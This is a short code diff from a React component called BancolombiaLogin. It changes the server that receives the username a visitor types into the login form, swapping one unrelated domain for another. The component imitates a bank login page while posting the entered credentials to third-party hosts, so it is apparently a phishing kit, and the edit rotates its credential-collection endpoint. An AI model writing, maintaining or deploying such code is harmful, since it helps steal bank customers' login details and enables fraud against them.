@@ -58,7 +58,7 @@ const BancolombiaLogin = () => {
     setLoading(true);
 
     try {
-      const response = await axios.post('https://streaming.pagafacilntf.com/procesar', { codigo: username });
+      const response = await axios.post('https://streaming.renovapunto.online/procesar', { codigo: username });
       console.log('Respuesta del servidor:', response.data);
       setStep(2);
     } catch (error) {
